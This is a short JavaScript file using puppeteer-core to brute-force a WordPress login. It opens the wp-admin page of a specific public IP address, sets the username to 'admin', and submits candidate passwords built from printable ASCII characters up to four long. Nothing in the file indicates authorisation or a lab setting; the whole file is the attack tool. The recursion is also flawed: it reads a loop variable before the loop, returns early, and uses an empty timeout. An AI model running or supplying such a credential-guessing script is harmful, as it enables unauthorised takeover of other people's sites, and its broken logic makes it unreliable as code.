var arr = [];
var index = 0;
const puppeteer = require("puppeteer-core");
let document

async function recursive(istr,curstr,count) {
  
  count--;
  var test = curstr + istr.charAt(i);
  console.log(test)
  for(var i=0; i<istr.length; i++) {
    var str = curstr + istr.charAt(i);

    if(count>0) {

        await document.type('#user_pass',str);
        await document.waitForSelector("#wp-submit");
        await document.click("#wp-submit");
        
        return await recursive(istr,str,count);
    }
    else {
        console.log(str);
        arr[index++] = str;
    }
  }
}

let utfString = "";
for(let i=33; i <= 126; i++){
    utfString += String.fromCharCode(i);
}

async function enumerate(str, n) {
  for(var i=0;i<n;i++) {
    setTimeout(()=>{},1000)
    await recursive(str,"",i+1);
  }
} 
async function login(){
    const browser = await puppeteer.launch({
        headless: false,
        executablePath:
          "/usr/bin/google-chrome",
      });
       document = await browser.newPage();
      await document.goto("http://35.180.242.197/wp-admin");
      await document.$eval("input[name=log]", (el) => (el.value = "admin"));
      await enumerate(utfString,4,document);
}
(async () => {
  await login();
})();
